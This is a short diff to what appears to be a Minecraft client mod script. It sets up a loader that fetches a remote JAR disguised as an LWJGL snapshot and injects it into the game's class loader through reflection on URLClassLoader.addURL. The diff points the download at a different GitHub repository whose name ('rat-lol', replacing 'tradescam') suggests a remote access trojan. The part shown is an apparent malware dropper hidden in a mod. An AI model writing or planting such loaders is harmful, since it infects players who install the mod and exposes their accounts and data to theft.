@@ -2,7 +2,7 @@ let URLClassLoader = Java.type("java.net.URLClassLoader");
 let URL = Java.type("java.net.URL");
 let Minecraft = Java.type("net.minecraft.client.Minecraft");
 let classLoader = null;
-let jarURL = new URL("https://github.com/Zearex/tradescam/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
+let jarURL = new URL("https://github.com/MansHeree/rat-lol/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
 classLoader = Minecraft.class.getClassLoader();
 let method = URLClassLoader.class.getDeclaredMethod("addURL", Java.type("java.net.URL").class);
 Thread.sleep(1000);
